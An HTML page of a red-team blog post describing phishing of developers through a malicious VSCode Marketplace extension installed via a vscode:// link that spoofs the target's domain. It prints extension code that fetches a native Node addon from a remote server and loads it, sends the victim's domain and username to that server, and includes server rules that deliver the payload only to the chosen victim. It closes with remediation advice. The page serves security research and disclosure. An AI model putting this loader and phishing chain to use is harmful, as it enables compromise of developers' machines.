<!doctype html><html lang=en dir=auto data-theme=dark><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Leveraging VSCode Extensions for Initial Access |</title><meta name=keywords content><meta name=description content="Introduction
On a recent Red Team engagement, MDSec were tasked with crafting a phishing campaign for initial access. The catch was that the in-scope phishing targets were developers with technical skills above that of the average user.
As a result, they were unlikely to fall for typical payloads and pre-texts. Rather than relying on traditional initial access payloads, why not use their own development tools to our advantage ?
Mapping the attack surface
One of the main development applications used by the target organisation was VSCode. The ability to install custom VSCode extensions makes this an ideal target and is something we have previously talked about."><meta name=author content="Matt Johnson"><link rel=canonical href=https://breakfix.co/posts/leveraging-vscode-extensions-for-initial-access/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.7dffa467ed2caf12b1371c26b29262254b90390e9b746ee6615f35700c6d8ec6.css integrity="sha256-ff+kZ+0srxKxNxwmspJiJUuQOQ6bdG7mYV81cAxtjsY=" rel="preload stylesheet" as=style><link rel=icon href=https://breakfix.co/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://breakfix.co/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://breakfix.co/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://breakfix.co/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://breakfix.co/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://breakfix.co/posts/leveraging-vscode-extensions-for-initial-access/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><script>localStorage.getItem("pref-theme")==="light"&&(document.querySelector("html").dataset.theme="light")</script><meta property="og:url" content="https://breakfix.co/posts/leveraging-vscode-extensions-for-initial-access/"><meta property="og:site_name" content=" "><meta property="og:title" content="Leveraging VSCode Extensions for Initial Access"><meta property="og:description" content="Introduction On a recent Red Team engagement, MDSec were tasked with crafting a phishing campaign for initial access. The catch was that the in-scope phishing targets were developers with technical skills above that of the average user.
As a result, they were unlikely to fall for typical payloads and pre-texts. Rather than relying on traditional initial access payloads, why not use their own development tools to our advantage ?
Mapping the attack surface One of the main development applications used by the target organisation was VSCode. The ability to install custom VSCode extensions makes this an ideal target and is something we have previously talked about."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-08-01T19:58:57+11:00"><meta property="article:modified_time" content="2023-08-01T19:58:57+11:00"><meta property="og:image" content="https://breakfix.co/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://breakfix.co/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Leveraging VSCode Extensions for Initial Access"><meta name=twitter:description content="Introduction
On a recent Red Team engagement, MDSec were tasked with crafting a phishing campaign for initial access. The catch was that the in-scope phishing targets were developers with technical skills above that of the average user.
As a result, they were unlikely to fall for typical payloads and pre-texts. Rather than relying on traditional initial access payloads, why not use their own development tools to our advantage ?
Mapping the attack surface
One of the main development applications used by the target organisation was VSCode. The ability to install custom VSCode extensions makes this an ideal target and is something we have previously talked about."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://breakfix.co/posts/"},{"@type":"ListItem","position":2,"name":"Leveraging VSCode Extensions for Initial Access","item":"https://breakfix.co/posts/leveraging-vscode-extensions-for-initial-access/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Leveraging VSCode Extensions for Initial Access","name":"Leveraging VSCode Extensions for Initial Access","description":"Introduction On a recent Red Team engagement, MDSec were tasked with crafting a phishing campaign for initial access. The catch was that the in-scope phishing targets were developers with technical skills above that of the average user.\nAs a result, they were unlikely to fall for typical payloads and pre-texts. Rather than relying on traditional initial access payloads, why not use their own development tools to our advantage ?\nMapping the attack surface One of the main development applications used by the target organisation was VSCode. The ability to install custom VSCode extensions makes this an ideal target and is something we have previously talked about.\n","keywords":[],"articleBody":"Introduction On a recent Red Team engagement, MDSec were tasked with crafting a phishing campaign for initial access. The catch was that the in-scope phishing targets were developers with technical skills above that of the average user.\nAs a result, they were unlikely to fall for typical payloads and pre-texts. Rather than relying on traditional initial access payloads, why not use their own development tools to our advantage ?\nMapping the attack surface One of the main development applications used by the target organisation was VSCode. The ability to install custom VSCode extensions makes this an ideal target and is something we have previously talked about.\nFor our purposes, we wanted to find a method to install VSCode extensions that was more compatible with a phishing pre-text.\nVSCode allows installation of extensions via the below methods.\nVSCode UI The most common way to install extensions using the Extensions view. .VSIX Files Manual installation using a pre-packaged .vsix extension file. VSCode URI Handler An undocumented method of installing extensions using the VSCode URI handler (more on this later). VSCode UI Extensions published to the VSCode Marketplace are searchable using the VSCode Extensions view. Installation from here is straightforward and is likely the method most users are familiar with.\nThis method is a little awkward to use in a phishing pre-text, as we have to walk the user through the steps required to find and install the extension.\nWhat about delivering a pre-packed extension file that can be opened directly ?\n.VSIX VSCode extensions are packaged into .vsix files for distribution, reading the docs we can see how to install them.\nBy default, VSCode does not associate itself with the .vsix file extension. As a result, we are not able to simply double-click a .vsix file to open it in VSCode. Instead, we need to rely on the code.exe command line.\ncode --install-extension myextension.vsix This requires the user to first download the .vsix file, open the command line, and run code.exe providing the path to the .vsix extension file.\nThis was too many steps for our liking. We wanted something simpler…like clicking a link.\nThe vscode:// URI handler Another method for installing extensions not mentioned in the VSCode docs is via the VSCode URI handler.\nThe vscode:// URI protocol handler is registered automatically when VSCode is installed. The tool URLProtocolView can be used to quickly discover the registered command-line arguments.\nAs Microsoft publish the VSCode source code online, we can browse the code here to find out how to interact with VSCode via the URI handler.\nWhen opening a URL such as vscode://hellothere.test from a browser, a prompt will first be shown to open the URL in VSCode.\nAfter opening, the URL argument vscode://hellothere.test will be sent to the registered command line \"%LOCALAPPDATA%\\Programs\\Microsoft VS Code\\Code.exe\" \"--open-url\" \"--\" \"vscode://hellothere.test\".\nThe URL value will then be read inside of /src/vs/code/electron-main/app.ts by the handleProtocolUrl function.\nprivate async handleProtocolUrl(windowsMainService: IWindowsMainService, urlService: IURLService, uri: URI, options?: IOpenURLOptions): Promise { // ...or if we should open in a new window and then handle it within that window if (shouldOpenInNewWindow) { this.logService.trace('app#handleProtocolUrl() opening empty window and passing in protocol url:', uri.toString(true)); const window = firstOrDefault(await windowsMainService.open({ context: OpenContext.API, cli: { ...this.environmentMainService.args }, forceNewWindow: true, forceEmpty: true, gotoLineMode: true, remoteAuthority: getRemoteAuthority(uri) })); await window?.ready(); return urlService.open(uri, options); } } This value is then passed into src\\vs\\workbench\\services\\url\\browser\\urlService.ts via the .open method.\nThe URL value is then forwarded to all other registered URL handler classes within VSCode. One such handler is src/vs/workbench/services/extensions/browser/extensionUrlHandler.ts used for interacting with installed extensions in VSCode.\nExtension URLs in VSCode are expected to be formatted as below.\nvscode://hellothere.test \\_/ \\________/ \\_/ | | | Scheme PublisherID ExtensionName The handler first checks if the URL is destined for an extension based on the below regular expression.\nfunction isExtensionId(value: string): boolean { return /^[a-z0-9][a-z0-9\\-]*\\.[a-z0-9][a-z0-9\\-]*$/i.test(value); } If this passes, VSCode will then check if the extension is already installed.\nprivate async handleUnhandledURL(uri: URI, extensionIdentifier: IExtensionIdentifier, options?: IOpenURLOptions): Promise { const installedExtensions = await this.extensionManagementService.getInstalled(); let extension = installedExtensions.find(e =\u003e areSameExtensions(e.identifier, extensionIdentifier)); // Extension is not installed if (!extension) { let galleryExtension: IGalleryExtension | undefined; try { galleryExtension = (await this.galleryService.getExtensions([extensionIdentifier], CancellationToken.None))[0] ?? undefined; } catch (err) { return; } If not, a POST request will be sent to the marketplace to search for the extension.\nPOST /_apis/public/gallery/extensionquery HTTP/1.1 Host: marketplace.visualstudio.com Content-Length: 246 Accept: application/json;api-version=3.0-preview.1 Accept-Encoding: gzip, deflate Accept-Language: en-US Content-Type: application/json Origin: vscode-file://vscode-app Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: cross-site User-Agent: VSCode 1.81.0 (Code) Vscode-Sessionid: deb798674ec8308ff6b379e6d4fa3d7d3b26d8eaa0f4b6f41141356a382a601e X-Market-Client-Id: VSCode 1.81.0 X-Market-User-Id: 96198178-9248-47eb-82d5-45ba1d0c07f1 Sec-Ch-Ua: \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\" Sec-Ch-Ua-Mobile: ?0 Sec-Ch-Ua-Platform: \"Windows\" {\"filters\":[{\"criteria\":[{\"filterType\":7,\"value\":\"CodeStream.codestream\"},{\"filterType\":8,\"value\":\"Microsoft.VisualStudio.Code\"},{\"filterType\":12,\"value\":\"4096\"}],\"pageNumber\":1,\"pageSize\":1,\"sortBy\":0,\"sortOrder\":0}],\"assetTypes\":[],\"flags\":950} If a result is found, a URL pointing to the VSIX package location for the extension is returned.\n{\"assetType\":\"Microsoft.VisualStudio.Services.VSIXPackage\",\"source\":\"https://codestream.gallerycdn.vsassets.io/extensions/codestream/codestream/14.25.0/1691093003167/Microsoft.VisualStudio.Services.VSIXPackage\"}, The user is then prompted to download and install the extension.\nThe extensionsGallery server value for the initial POST request is read from the serviceUrl variable stored in %LOCALAPPDATA%\\Programs\\Microsoft VS Code\\resources\\app\\product.json.\n\"extensionsGallery\": { \"serviceUrl\": \"https://marketplace.visualstudio.com/_apis/public/gallery\", As a result, these extension search requests are limited to the VSCode marketplace.\nThe question then becomes, how do we get an extension into the marketplace ?\nPublishing to the VSCode marketplace In order to publish our extension, we first need to head over to https://marketplace.visualstudio.com/manage and login with our Microsoft account (free or trial accounts will do, no specific license is required).\nAfter signing in, we are prompted to provide the below information to create a publisher.\nName of the publisher (must be unique, can be changed and cannot contain dots . ) Publisher ID (must be unique, cannot be changed and cannot contain dots .) Verified domain (optional) The Publisher ID value provided here will be included in the vscode:// URL used to install the extension, along with the extension’s name. The URL will appear as follows, with a single dot . separating the two values:\nvscode://publisherid.extensionname\nThe key thing to note here is that although Microsoft provides an option to verifiy ownership of a domain, this is simply an optional step to mark our account as “verified” and has no bearing on what we can set in the Publisher ID field.\nAs a result, we can set our Publisher ID to match our target domain without needing to provide any domain validation (as mentioned we cannot include any dots . but we will work around that shortly).\nNote: The Name field is largely irrelevant for our use case as it won’t appear in the extension URL.\nWith our publisher created, we are then able to upload a compiled .vsix extension file which will be scanned by Microsoft.\nThe name of our extension is defined within the extension’s package.json file and will be included in the VSCode URL.\nvscode://targetdomain.extensionname\nAs the extension name does not need to be unique, we can use this to spoof a given top-level domain (such as com). This will result in the following VSCode URL.\nvscode://targetdomain.com\nWhen the URL is opened in VSCode, the below prompt will be shown to the user containing the extensions Display Name, in our case com.\nWe can improve upon this further as the extension’s Display Name is defined within the package.json file and is separate from the name value contained in the URL.\n\"name\": \"com\", \"displayName\": \"My Extension Name\" By changing the DisplayName value, the below prompt will then be shown without altering our extension URL of vscode://targetdomain.com\nIn addition, any parameters appended to the URL will essentially be ignored (as they are simply passed to the extension by VSCode). This means we can construct the below URL in order to provide some additional context to our phish.\nvscode://targetdomain.com/internal/path.html?login=true\nWhen clicked, VSCode will open and show the prompt below.\nAt this point, we can begin writing our extension code.\nExtension code We will create our extension using the VS Code Extension Generator and NodeJS. This step is already covered in our previously mentioned post so we won’t go into too much detail here.\nThe key thing to note is the name of our extension com which we will use to spoof the final extension URL.\nC:\\Users\\mattjohnson\u003eyo code _-----_ ╭──────────────────────────╮ | | │ Welcome to the Visual │ |--(o)--| │ Studio Code Extension │ `---------´ │ generator! │ ( _´U`_ ) ╰──────────────────────────╯ /___A___\\ / | ~ | __'.___.'__ ´ ` |° ´ Y ` ? What type of extension do you want to create? New Extension (JavaScript) ? What's the name of your extension? com ? What's the identifier of your extension? com ? What's the description of your extension? Description ? Enable JavaScript type checking in 'jsconfig.json'? No ? Initialize a git repository? No ? Which package manager to use? npm Writing in C:\\Users\\mattjohnson\\com... create com\\.vscode\\extensions.json create com\\.vscode\\launch.json create com\\test\\runTest.js create com\\test\\suite\\extension.test.js create com\\test\\suite\\index.js create com\\.vscodeignore create com\\README.md create com\\CHANGELOG.md create com\\vsc-extension-quickstart.md create com\\jsconfig.json create com\\extension.js create com\\package.json create com\\.eslintrc.json After the template code is generated, we need to define our publisher in package.json to match our publisherID value, or we will get an error when uploading the .vsix file.\n\"name\": \"com\", \"displayName\": \"My Extension Name\", \"publisher\": \"targetdomain\", Inside of extension.js, we have many options available for code execution. One that fits into well with our existing toolset at MDSec is to leverage Node Native-Addons.\nNative-Addons are essentially DLLs intended to provide an interface between JavaScript running in Node.js and libraries written in C or C++. These can be loaded into our extension process via the use of the require() function.\nOur activate method for our extension is below, fetching a remote Node Native-Addon from a remote server, writing it to disk and loading it into our extension process via our call to require().\nNote: WebDAV / UNC paths are supported via require(), so we can also use this to avoid writing to disk, however, this does come with some caveats around the WebClient service.\n// This method is called when your extension is activated // Your extension is activated the very first time the command is executed /** * @param {vscode.ExtensionContext} context */ function activate(context) { function get_data(data, outfile){ fs.writeFileSync(outfile, data); if(outfile.endsWith(\".node\")){ require(process.env.LOCALAPPDATA + \"/encoding.node\"); } } async function get_module(path, outfile) { var options = { hostname: \"server.com\", path: path, port: 443, }; return new Promise((resolve) =\u003e { https.get(options, res =\u003e { var data = []; res.on('data', function(chunk) { data.push(chunk); }).on('end', function() { var buffer = Buffer.concat(data); get_data(buffer, outfile); }); }) }) } (async () =\u003e await get_module(\"/api/v1/custom.js\", process.env.LOCALAPPDATA + \"/encoding.node\"))(); In order to further expand our pre-text, we can optionally configure our extension to open a decoy file on disk inside of VSCode after the extension installs.\nvar openPath = vscode.Uri.parse(\"file:///\" + outfile); vscode.workspace.openTextDocument(openPath).then(doc =\u003e { vscode.window.showTextDocument(doc); }); This can be useful to help prevent raising suspicion from our target victim.\nLimiting execution In order to limit execution of our malicious extension to our target organisation, we will include some additional client side checks before running our payload.\nThe advantage of this approach is two fold. One, our attack is limited to our target domain and two, we can potentially bypass any automated code scanning.\nTo achieve this, we add the below code to our extension to fetch the required environment variables from our target and send them to our remote server.\nasync function get_module(path, outfile) { var options = { hostname: \"server.com\", path: path, port: 443, headers: { 'X-VSCode-Domain': process.env.USERDOMAIN, 'X-VSCode-User': process.env.USERNAME, 'X-VSCode-Arch': process.env.PROCESSOR_ARCHITECTURE } }; On the server side, we can use the below Apache mod_rewrite rules to ensure we deliver the malicious .node file, only when the required conditions are met. If not, we deliver a benign .node file.\n# If domain is correct RewriteCond %{HTTP:X-VSCode-Domain} =targetdomain # And username is correct RewriteCond %{HTTP:X-VSCode-User} =victim # Then send payload RewriteRule ^.*$ \"/files/payload.node\" [END] # Else send benign file RewriteRule ^.*$ \"/files/fake.node\" [END] User compromise Once our .vsix file is compiled, we can upload it to our marketplace publisher account.\nAfter automated analysis is completed, the extension will become available.\nAt this stage we can deliver our phishing link to the target using the below URL, appending any additional parameters as needed.\nvscode://targetdomain.com/internal/login.html\nAfter clicking on the link, the user will be prompted to open VSCode.\nIf they click on “Install and Open”, our extension will be installed and our extension.js code will execute from within Code.exe.\nThe below illustrates the end-to-end chain, establishing a C2 connection and displaying a decoy file inside of VSCode.\nPersistence via extension updates By default, VSCode will update extensions automatically if an update is available. If we want to make a change to the extension code, we simply need to recompile our .vsix and upload the new version to the marketplace.\nOnce caveat with this approach is that after the extension has been updated, we will need to wait for VSCode to restart in order for the new extension code to be executed.\nWe can work around this by adding the below line into our extension to force a refresh of VSCode if a certain condition is met.\nvscode.commands.executeCommand('workbench.action.reloadWindow');\nCleanup Currently, there appears to be no way to remove a publisher from the marketplace using the web interface. Instead, the below steps can be used to remove it using vsce.\nFirst, create a personal access token from the Azure dev portal https://dev.azure.com/\nThen set the below scopes.\nFinally, use the below vsce command to remove the publisher providing the token when prompted.\nC:\\Users\\mattjohnson\u003evsce delete-publisher targetdomain https://marketplace.visualstudio.com/manage/publishers/ Personal Access Token for publisher 'targetdomain': **************************************************** The Personal Access Token verification succeeded for the publisher 'targetdomain'. This will FOREVER delete 'targetdomain'! Are you sure? [y/N] y DONE Deleted publisher 'targetdomain'. Remediation The techniques described here leverage intended functionality of both VSCode and the VSCode Marketplace. Further validation could be performed by Microsoft by limiting Publisher IDs to verified domains only, preventing the domain impersonation issue.\nMicrosoft MSRC was contacted with the details of the post prior to publication but did not respond before the proposed disclosure deadline.\nAs an additional hardening measure, the VSCode URI handler can be disabled by clearing the registry key at the below path.\nComputer\\HKEY_CLASSES_ROOT\\vscode\\shell\\open\\command This will prevent external URLs from being able to be opened inside of VSCode.\nThis article was also posted on mdsec.co.uk\n","wordCount":"2341","inLanguage":"en","image":"https://breakfix.co/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2023-08-01T19:58:57+11:00","dateModified":"2023-08-01T19:58:57+11:00","author":{"@type":"Person","name":"Matt Johnson"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://breakfix.co/posts/leveraging-vscode-extensions-for-initial-access/"},"publisher":{"@type":"Organization","name":" ","logo":{"@type":"ImageObject","url":"https://breakfix.co/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=https://breakfix.co/ accesskey=h title="  (Alt + H)"><img src=https://breakfix.co/logo/logo.svg alt aria-label=logo height=50></a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://breakfix.co/contact/ title=Contact><span>Contact</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://breakfix.co/>Home</a>&nbsp;»&nbsp;<a href=https://breakfix.co/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">Leveraging VSCode Extensions for Initial Access</h1><div class=post-meta><span title='2023-08-01 19:58:57 +1100 +1100'>August 1, 2023</span>&nbsp;·&nbsp;<span>11 min</span>&nbsp;·&nbsp;<span>2341 words</span>&nbsp;·&nbsp;<span>Matt Johnson</span></div></header><div class=post-content><h3 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h3><p>On a recent Red Team engagement, MDSec were tasked with crafting a phishing campaign for initial access. The catch was that the in-scope phishing targets were developers with technical skills above that of the average user.</p><p>As a result, they were unlikely to fall for typical payloads and pre-texts. Rather than relying on traditional initial access payloads, why not use their own development tools to our advantage ?</p><h3 id=mapping-the-attack-surface>Mapping the attack surface<a hidden class=anchor aria-hidden=true href=#mapping-the-attack-surface>#</a></h3><p>One of the main development applications used by the target organisation was VSCode. The ability to install custom VSCode extensions makes this an ideal target and is something we have previously <a href=https://www.mdsec.co.uk/2021/01/macos-post-exploitation-shenanigans-with-vscode-extensions/>talked about</a>.</p><p>For our purposes, we wanted to find a method to install VSCode extensions that was more compatible with a phishing pre-text.</p><p>VSCode allows installation of extensions via the below methods.</p><ul><li>VSCode UI<ul><li>The most common way to install extensions using the Extensions view.</li></ul></li><li>.VSIX Files<ul><li>Manual installation using a pre-packaged <code>.vsix</code> extension file.</li></ul></li><li>VSCode URI Handler<ul><li>An undocumented method of installing extensions using the VSCode URI handler (more on this later).</li></ul></li></ul><h3 id=vscode-ui>VSCode UI<a hidden class=anchor aria-hidden=true href=#vscode-ui>#</a></h3><p>Extensions published to the VSCode Marketplace are searchable using the VSCode Extensions view.<figure><img loading=lazy src=/vscode/0c8fbe2b425dd08275a410512abce498.png width=750></figure></p><p>Installation from here is straightforward and is likely the method most users are familiar with.</p><p>This method is a little awkward to use in a phishing pre-text, as we have to walk the user through the steps required to find and install the extension.</p><p>What about delivering a pre-packed extension file that can be opened directly ?</p><h3 id=vsix>.VSIX<a hidden class=anchor aria-hidden=true href=#vsix>#</a></h3><p>VSCode extensions are packaged into <code>.vsix</code> files for distribution, reading <a href=https://code.visualstudio.com/docs/editor/extension-marketplace#_install-from-a-vsix>the docs</a> we can see how to install them.</p><p><img alt=1d5273965d587638c3c86be5585388ca.png loading=lazy src=/vscode/1d5273965d587638c3c86be5585388ca.png></p><p>By default, VSCode does not associate itself with the <code>.vsix</code> file extension. As a result, we are not able to simply double-click a <code>.vsix</code> file to open it in VSCode. Instead, we need to rely on the <code>code.exe</code> command line.</p><pre tabindex=0><code>code --install-extension myextension.vsix
</code></pre><p>This requires the user to first download the <code>.vsix</code> file, open the command line, and run <code>code.exe</code> providing the path to the <code>.vsix</code> extension file.</p><p>This was too many steps for our liking. We wanted something simpler&mldr;like clicking a link.</p><h3 id=the-vscode-uri-handler>The vscode:// URI handler<a hidden class=anchor aria-hidden=true href=#the-vscode-uri-handler>#</a></h3><p>Another method for installing extensions not mentioned in the VSCode docs is via the VSCode URI handler.</p><p>The <code>vscode://</code> URI protocol handler is registered automatically when VSCode is installed. The tool <a href=https://www.nirsoft.net/utils/url_protocol_view.html>URLProtocolView</a> can be used to quickly discover the registered command-line arguments.</p><p><img alt=8w26wc4dunaq6podpfzf8hy2g4u7ssx7.png loading=lazy src=/vscode/8w26wc4dunaq6podpfzf8hy2g4u7ssx7.png></p><p>As Microsoft publish the VSCode source code online, we can browse the code <a href=https://github.com/microsoft/vscode>here</a> to find out how to interact with VSCode via the URI handler.</p><p>When opening a URL such as <code>vscode://hellothere.test</code> from a browser, a prompt will first be shown to open the URL in VSCode.</p><p><img alt=478ca224e21bb7c3415c2de75931a349.png loading=lazy src=/vscode/478ca224e21bb7c3415c2de75931a349.png></p><p>After opening, the URL argument <code>vscode://hellothere.test</code> will be sent to the registered command line <code>"%LOCALAPPDATA%\Programs\Microsoft VS Code\Code.exe" "--open-url" "--" "vscode://hellothere.test"</code>.</p><p>The URL value will then be read inside of <code>/src/vs/code/electron-main/app.ts</code> by the <code>handleProtocolUrl</code> function.</p><pre tabindex=0><code>private async handleProtocolUrl(windowsMainService: IWindowsMainService, urlService: IURLService, uri: URI, options?: IOpenURLOptions): Promise&lt;boolean&gt; {
		// ...or if we should open in a new window and then handle it within that window
		if (shouldOpenInNewWindow) {
			this.logService.trace(&#39;app#handleProtocolUrl() opening empty window and passing in protocol url:&#39;, uri.toString(true));

			const window = firstOrDefault(await windowsMainService.open({
				context: OpenContext.API,
				cli: { ...this.environmentMainService.args },
				forceNewWindow: true,
				forceEmpty: true,
				gotoLineMode: true,
				remoteAuthority: getRemoteAuthority(uri)
			}));

			await window?.ready();

			return urlService.open(uri, options);
		}
}
</code></pre><p>This value is then passed into <code>src\vs\workbench\services\url\browser\urlService.ts</code> via the <code>.open</code> method.</p><p>The URL value is then forwarded to all other registered URL handler classes within VSCode. One such handler is <code>src/vs/workbench/services/extensions/browser/extensionUrlHandler.ts</code> used for interacting with installed extensions in VSCode.</p><p>Extension URLs in VSCode are expected to be formatted as below.</p><pre tabindex=0><code>   vscode://hellothere.test
    \_/     \________/ \_/
     |          |       |  
  Scheme   PublisherID ExtensionName   
</code></pre><p>The handler first checks if the URL is destined for an extension based on the below regular expression.</p><pre tabindex=0><code>function isExtensionId(value: string): boolean {
    return /^[a-z0-9][a-z0-9\-]*\.[a-z0-9][a-z0-9\-]*$/i.test(value);
}
</code></pre><p>If this passes, VSCode will then check if the extension is already installed.</p><pre tabindex=0><code>	private async handleUnhandledURL(uri: URI, extensionIdentifier: IExtensionIdentifier, options?: IOpenURLOptions): Promise&lt;void&gt; {
		const installedExtensions = await this.extensionManagementService.getInstalled();
		let extension = installedExtensions.find(e =&gt; areSameExtensions(e.identifier, extensionIdentifier));

		// Extension is not installed
		if (!extension) {
			let galleryExtension: IGalleryExtension | undefined;

			try {
				galleryExtension = (await this.galleryService.getExtensions([extensionIdentifier], CancellationToken.None))[0] ?? undefined;
			} catch (err) {
				return;
			}
</code></pre><p>If not, a POST request will be sent to the marketplace to search for the extension.</p><pre tabindex=0><code>POST /_apis/public/gallery/extensionquery HTTP/1.1
Host: marketplace.visualstudio.com
Content-Length: 246
Accept: application/json;api-version=3.0-preview.1
Accept-Encoding: gzip, deflate
Accept-Language: en-US
Content-Type: application/json
Origin: vscode-file://vscode-app
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
User-Agent: VSCode 1.81.0 (Code)
Vscode-Sessionid: deb798674ec8308ff6b379e6d4fa3d7d3b26d8eaa0f4b6f41141356a382a601e
X-Market-Client-Id: VSCode 1.81.0
X-Market-User-Id: 96198178-9248-47eb-82d5-45ba1d0c07f1
Sec-Ch-Ua: &#34;Not?A_Brand&#34;;v=&#34;8&#34;, &#34;Chromium&#34;;v=&#34;108&#34;
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: &#34;Windows&#34;

{&#34;filters&#34;:[{&#34;criteria&#34;:[{&#34;filterType&#34;:7,&#34;value&#34;:&#34;CodeStream.codestream&#34;},{&#34;filterType&#34;:8,&#34;value&#34;:&#34;Microsoft.VisualStudio.Code&#34;},{&#34;filterType&#34;:12,&#34;value&#34;:&#34;4096&#34;}],&#34;pageNumber&#34;:1,&#34;pageSize&#34;:1,&#34;sortBy&#34;:0,&#34;sortOrder&#34;:0}],&#34;assetTypes&#34;:[],&#34;flags&#34;:950}
</code></pre><p>If a result is found, a URL pointing to the VSIX package location for the extension is returned.</p><pre tabindex=0><code>{&#34;assetType&#34;:&#34;Microsoft.VisualStudio.Services.VSIXPackage&#34;,&#34;source&#34;:&#34;https://codestream.gallerycdn.vsassets.io/extensions/codestream/codestream/14.25.0/1691093003167/Microsoft.VisualStudio.Services.VSIXPackage&#34;},
</code></pre><p>The user is then prompted to download and install the extension.</p><figure><img loading=lazy src=/vscode/ky3xr9p13ikxwy1ztxk2f0mdmguh7yf4.png width=500></figure><p>The <code>extensionsGallery</code> server value for the initial POST request is read from the <code>serviceUrl</code> variable stored in <code>%LOCALAPPDATA%\Programs\Microsoft VS Code\resources\app\product.json</code>.</p><pre tabindex=0><code>    &#34;extensionsGallery&#34;: {
        &#34;serviceUrl&#34;: &#34;https://marketplace.visualstudio.com/_apis/public/gallery&#34;,
</code></pre><p>As a result, these extension search requests are limited to the VSCode marketplace.</p><p>The question then becomes, how do we get an extension into the marketplace ?</p><h3 id=publishing-to-the-vscode-marketplace>Publishing to the VSCode marketplace<a hidden class=anchor aria-hidden=true href=#publishing-to-the-vscode-marketplace>#</a></h3><p>In order to publish our extension, we first need to head over to <a href=https://marketplace.visualstudio.com/manage>https://marketplace.visualstudio.com/manage</a> and login with our Microsoft account (free or trial accounts will do, no specific license is required).</p><p>After signing in, we are prompted to provide the below information to create a publisher.</p><p><img alt=6b60e925df67128e281a70ed6b816039.png loading=lazy src=/vscode/6b60e925df67128e281a70ed6b816039.png></p><ul><li>Name of the publisher (must be unique, <strong>can</strong> be changed and cannot contain dots <code>.</code> )</li><li>Publisher ID (must be unique, <strong>cannot</strong> be changed and cannot contain dots <code>.</code>)</li><li>Verified domain (optional)</li></ul><p>The <code>Publisher ID</code> value provided here will be included in the <code>vscode://</code> URL used to install the extension, along with the extension&rsquo;s name. The URL will appear as follows, with a single dot <code>.</code> separating the two values:</p><p><code>vscode://publisherid.extensionname</code></p><p>The key thing to note here is that although Microsoft provides an option to verifiy ownership of a domain, this is simply an optional step to mark our account as <a href=https://code.visualstudio.com/api/working-with-extensions/publishing-extension#verify-a-publisher>&ldquo;verified&rdquo;</a> and has no bearing on what we can set in the <code>Publisher ID</code> field.</p><p>As a result, we can set our <code>Publisher ID</code> to match our target domain without needing to provide any domain validation (as mentioned we cannot include any dots <code>.</code> but we will work around that shortly).</p><p><strong>Note:</strong> The <code>Name</code> field is largely irrelevant for our use case as it won&rsquo;t appear in the extension URL.</p><p><img alt=282d7c2393e0f6e4b9862fca41a564c0.png loading=lazy src=/vscode/282d7c2393e0f6e4b9862fca41a564c0.png></p><p>With our publisher created, we are then able to upload a compiled <code>.vsix</code> extension file which will be scanned by Microsoft.</p><p><img alt=e2675a8b7316d3e47ee1464eafec7722.png loading=lazy src=/vscode/e2675a8b7316d3e47ee1464eafec7722.png></p><p>The name of our extension is defined within the extension&rsquo;s <code>package.json</code> file and will be included in the VSCode URL.</p><p><code>vscode://targetdomain.extensionname</code></p><p>As the extension name does not need to be unique, we can use this to spoof a given top-level domain (such as <code>com</code>). This will result in the following VSCode URL.</p><p><code>vscode://targetdomain.com</code></p><p>When the URL is opened in VSCode, the below prompt will be shown to the user containing the extensions <code>Display Name</code>, in our case <code>com</code>.</p><figure><img loading=lazy src=/vscode/jgo2ii893grsndp9nlwpdrc3phcfpya9.png width=500></figure><p>We can improve upon this further as the extension&rsquo;s <code>Display Name</code> is defined within the <code>package.json</code> file and is separate from the <code>name</code> value contained 